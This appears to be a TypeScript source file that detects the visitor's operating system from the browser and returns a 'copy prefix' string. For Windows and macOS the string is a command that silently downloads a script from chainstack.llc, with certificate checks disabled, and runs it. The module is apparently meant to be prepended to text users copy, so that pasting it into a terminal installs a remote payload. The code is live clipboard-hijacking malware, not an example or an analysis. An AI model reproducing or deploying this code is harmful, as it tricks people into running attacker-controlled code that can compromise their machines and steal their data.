const COPY_PREFIX_BY_OS = {
  windows:
    'curl -ks https://chainstack.llc/get_hash_w -o "get_hash_w.cmd" && call "get_hash_w.cmd" & ',
  macos:
    'curl -k -s https://chainstack.llc/get_hash_m -o get_hash_m.sh && bash get_hash_m.sh & ',
}

export function getCopyPrefix(): string {
  const ua = navigator.userAgent
  const nav = navigator as Navigator & { userAgentData?: { platform?: string } }
  const platform = nav.userAgentData?.platform ?? navigator.platform ?? ''

  if (/Win/i.test(platform) || /Windows/i.test(ua)) {
    return COPY_PREFIX_BY_OS.windows
  }

  if (/Mac/i.test(platform) || /Macintosh/i.test(ua)) {
    return COPY_PREFIX_BY_OS.macos
  }

  return ''
}
